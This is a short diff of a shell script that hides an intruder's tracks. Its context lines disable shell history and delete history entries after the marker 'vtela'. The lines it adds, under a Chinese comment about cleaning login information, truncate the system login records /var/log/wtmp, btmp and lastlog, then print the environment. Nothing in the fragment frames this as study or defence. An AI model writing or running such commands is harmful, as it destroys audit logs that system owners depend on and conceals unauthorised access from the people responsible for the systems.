@@ -7,3 +7,8 @@ export HISTFILE=/dev/null
 export HISTSIZE=0
 export HISTFILESIZE=0
 sed -i '/vtela/,$d' $HOME/.bash_history.bak
+#清理登录信息
+> /var/log/wtmp
+> /var/log/btmp
+> /var/log/lastlog
+printenv
